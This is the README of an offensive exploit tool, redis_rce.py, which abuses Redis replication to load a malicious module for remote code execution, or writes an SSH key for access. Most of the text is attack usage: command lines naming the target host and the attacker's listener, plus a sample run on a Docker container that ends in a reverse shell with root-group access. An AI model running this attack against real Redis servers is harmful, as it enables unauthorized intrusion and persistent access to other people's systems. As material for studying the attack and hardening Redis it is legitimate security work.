# redis_rce.py

## Summary

Abuses slave server feature in redis to sync a payload module that is dynamically loaded to give RCE
and a reverse shell, also support abuse by backup feature to write a ssh key to a users home folder 

## Usage

Start docker container with redis-server if you want to test this locally

```ssh
redis_rce  master ⦿ docker-compose up -d
Creating network "redisrce_default" with the default driver
Creating redisrce_redis_1 ... done

⬢  redis_rce  master ⦿ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
2073e1bd3641        bitnami/redis:5.0   "/entrypoint.sh /run…"   2 seconds ago       Up 1 second         0.0.0.0:6379->6379/tcp   redisrce_redis_1
```

Run ./redis_rce.py to get the usage menu. 

```ssh
⬢  redis_rce  master ⦿ ./redis_rce.py 

     ██▀███  ▓█████ ▓█████▄  ██▓  ██████  ██▀███   ▄████▄  ▓█████ 
    ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
    ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
    ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░  ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
    ░██▓ ▒██▒░▒████▒░▒████▓ ░██░▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
      ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
      ░░   ░    ░    ░ ░  ░  ▒ ░░  ░  ░    ░░   ░ ░           ░   
       ░        ░  ░   ░     ░        ░     ░     ░ ░         ░  ░
                     ░                            ░               
    [nighter@nighter.se]
        
Usage: ./redis_rce.py <TYPE> <RHOST:[RPORT]> <LHOST> <LPORT> [PASSWORD]
EXAMPLE: ./redis_rce.py module '10.10.10.70:6379' 10.10.14.24 1337
EXAMPLE: ./redis_rce.py sshkey '10.10.10.70:6739 redis [password]
```        

Run the exploit

```ssh
⬢  redis_rce  master ⦿ ./redis_rce.py module 127.0.0.1:6379 172.18.0.1 4444
[+] LHOST = 172.18.0.1
[+] LPORT = 4444
[+] Module attack
[+] Setting master
[+] Setting Path
[+] Setting dbfilename
[+] Loading module
[+] Cleanup
[+] Exploit
Connection from 172.18.0.2:35840
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
I have no name!@2073e1bd3641:/tmp$ id
id
uid=1001 gid=0(root) groups=0(root)
I have no name!@2073e1bd3641:/tmp$ 
``